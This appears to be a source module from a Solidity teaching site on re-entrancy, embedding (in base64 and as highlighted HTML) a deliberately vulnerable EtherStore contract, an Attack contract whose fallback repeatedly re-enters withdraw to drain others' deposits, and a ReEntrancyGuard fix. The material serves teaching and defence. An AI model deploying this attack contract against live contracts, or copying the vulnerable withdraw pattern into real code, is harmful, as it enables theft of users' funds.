// metadata
export const version = "0.8.26"
export const title = "Re-Entrancy"
export const description = "An example of re-entrancy attack in Solidity"
export const cyfrinLink =
  "https://www.cyfrin.io/glossary/re-entrancy-hack-solidity-code-example"

export const keywords = ["hack", "security", "re-entrancy"]

export const codes = [
  {
    fileName: "ReEntrancy.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCkV0aGVyU3RvcmUgaXMgYSBjb250cmFjdCB3aGVyZSB5b3UgY2FuIGRlcG9zaXQgYW5kIHdpdGhkcmF3IEVUSC4KVGhpcyBjb250cmFjdCBpcyB2dWxuZXJhYmxlIHRvIHJlLWVudHJhbmN5IGF0dGFjay4KTGV0J3Mgc2VlIHdoeS4KCjEuIERlcGxveSBFdGhlclN0b3JlCjIuIERlcG9zaXQgMSBFdGhlciBlYWNoIGZyb20gQWNjb3VudCAxIChBbGljZSkgYW5kIEFjY291bnQgMiAoQm9iKSBpbnRvIEV0aGVyU3RvcmUKMy4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgRXRoZXJTdG9yZQo0LiBDYWxsIEF0dGFjay5hdHRhY2sgc2VuZGluZyAxIGV0aGVyICh1c2luZyBBY2NvdW50IDMgKEV2ZSkpLgogICBZb3Ugd2lsbCBnZXQgMyBFdGhlciBiYWNrICgyIEV0aGVyIHN0b2xlbiBmcm9tIEFsaWNlIGFuZCBCb2IsCiAgIHBsdXMgMSBFdGhlciBzZW50IGZyb20gdGhpcyBjb250cmFjdCkuCgpXaGF0IGhhcHBlbmVkPwpBdHRhY2sgd2FzIGFibGUgdG8gY2FsbCBFdGhlclN0b3JlLndpdGhkcmF3IG11bHRpcGxlIHRpbWVzIGJlZm9yZQpFdGhlclN0b3JlLndpdGhkcmF3IGZpbmlzaGVkIGV4ZWN1dGluZy4KCkhlcmUgaXMgaG93IHRoZSBmdW5jdGlvbnMgd2VyZSBjYWxsZWQKLSBBdHRhY2suYXR0YWNrCi0gRXRoZXJTdG9yZS5kZXBvc2l0Ci0gRXRoZXJTdG9yZS53aXRoZHJhdwotIEF0dGFjayBmYWxsYmFjayAocmVjZWl2ZXMgMSBFdGhlcikKLSBFdGhlclN0b3JlLndpdGhkcmF3Ci0gQXR0YWNrLmZhbGxiYWNrIChyZWNlaXZlcyAxIEV0aGVyKQotIEV0aGVyU3RvcmUud2l0aGRyYXcKLSBBdHRhY2sgZmFsbGJhY2sgKHJlY2VpdmVzIDEgRXRoZXIpCiovCgpjb250cmFjdCBFdGhlclN0b3JlIHsKICAgIG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50MjU2KSBwdWJsaWMgYmFsYW5jZXM7CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICBiYWxhbmNlc1ttc2cuc2VuZGVyXSArPSBtc2cudmFsdWU7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcoKSBwdWJsaWMgewogICAgICAgIHVpbnQyNTYgYmFsID0gYmFsYW5jZXNbbXNnLnNlbmRlcl07CiAgICAgICAgcmVxdWlyZShiYWwgPiAwKTsKCiAgICAgICAgKGJvb2wgc2VudCwpID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiBiYWx9KCIiKTsKICAgICAgICByZXF1aXJlKHNlbnQsICJGYWlsZWQgdG8gc2VuZCBFdGhlciIpOwoKICAgICAgICBiYWxhbmNlc1ttc2cuc2VuZGVyXSA9IDA7CiAgICB9CgogICAgLy8gSGVscGVyIGZ1bmN0aW9uIHRvIGNoZWNrIHRoZSBiYWxhbmNlIG9mIHRoaXMgY29udHJhY3QKICAgIGZ1bmN0aW9uIGdldEJhbGFuY2UoKSBwdWJsaWMgdmlldyByZXR1cm5zICh1aW50MjU2KSB7CiAgICAgICAgcmV0dXJuIGFkZHJlc3ModGhpcykuYmFsYW5jZTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIEV0aGVyU3RvcmUgcHVibGljIGV0aGVyU3RvcmU7CiAgICB1aW50MjU2IHB1YmxpYyBjb25zdGFudCBBTU9VTlQgPSAxIGV0aGVyOwoKICAgIGNvbnN0cnVjdG9yKGFkZHJlc3MgX2V0aGVyU3RvcmVBZGRyZXNzKSB7CiAgICAgICAgZXRoZXJTdG9yZSA9IEV0aGVyU3RvcmUoX2V0aGVyU3RvcmVBZGRyZXNzKTsKICAgIH0KCiAgICAvLyBGYWxsYmFjayBpcyBjYWxsZWQgd2hlbiBFdGhlclN0b3JlIHNlbmRzIEV0aGVyIHRvIHRoaXMgY29udHJhY3QuCiAgICBmYWxsYmFjaygpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIGlmIChhZGRyZXNzKGV0aGVyU3RvcmUpLmJhbGFuY2UgPj0gQU1PVU5UKSB7CiAgICAgICAgICAgIGV0aGVyU3RvcmUud2l0aGRyYXcoKTsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgZXh0ZXJuYWwgcGF5YWJsZSB7CiAgICAgICAgcmVxdWlyZShtc2cudmFsdWUgPj0gQU1PVU5UKTsKICAgICAgICBldGhlclN0b3JlLmRlcG9zaXR7dmFsdWU6IEFNT1VOVH0oKTsKICAgICAgICBldGhlclN0b3JlLndpdGhkcmF3KCk7CiAgICB9CgogICAgLy8gSGVscGVyIGZ1bmN0aW9uIHRvIGNoZWNrIHRoZSBiYWxhbmNlIG9mIHRoaXMgY29udHJhY3QKICAgIGZ1bmN0aW9uIGdldEJhbGFuY2UoKSBwdWJsaWMgdmlldyByZXR1cm5zICh1aW50MjU2KSB7CiAgICAgICAgcmV0dXJuIGFkZHJlc3ModGhpcykuYmFsYW5jZTsKICAgIH0KfQo=",
  },
  {
    fileName: "ReEntrancyGuard.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmNvbnRyYWN0IFJlRW50cmFuY3lHdWFyZCB7CiAgICBib29sIGludGVybmFsIGxvY2tlZDsKCiAgICBtb2RpZmllciBub1JlZW50cmFudCgpIHsKICAgICAgICByZXF1aXJlKCFsb2NrZWQsICJObyByZS1lbnRyYW5jeSIpOwogICAgICAgIGxvY2tlZCA9IHRydWU7CiAgICAgICAgXzsKICAgICAgICBsb2NrZWQgPSBmYWxzZTsKICAgIH0KfQo=",
  },
]

const html = `<h3>Vulnerability</h3>
<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>
<p>Reentrancy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-comment">/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let&#x27;s see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ether back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint256</span> bal <span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        <span class="hljs-built_in">require</span>(bal <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>);

        (<span class="hljs-keyword">bool</span> sent,) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: bal}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherStore <span class="hljs-keyword">public</span> etherStore;
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> AMOUNT <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _etherStoreAddress</span>) </span>{
        etherStore <span class="hljs-operator">=</span> EtherStore(_etherStoreAddress);
    }

    <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> AMOUNT) {
            etherStore.withdraw();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> AMOUNT);
        etherStore.deposit{<span class="hljs-built_in">value</span>: AMOUNT}();
        etherStore.withdraw();
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}
</code></pre><h3>Preventative Techniques</h3>
<ul>
<li>Ensure all state changes happen before calling external contracts</li>
<li>Use function modifiers that prevent re-entrancy</li>
</ul>
<p>Here is an example of a re-entrancy guard</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReEntrancyGuard</span> </span>{
    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">internal</span> locked;

    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">noReentrant</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-operator">!</span>locked, <span class="hljs-string">"No re-entrancy"</span>);
        locked <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">_</span>;
        locked <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>`

export default html
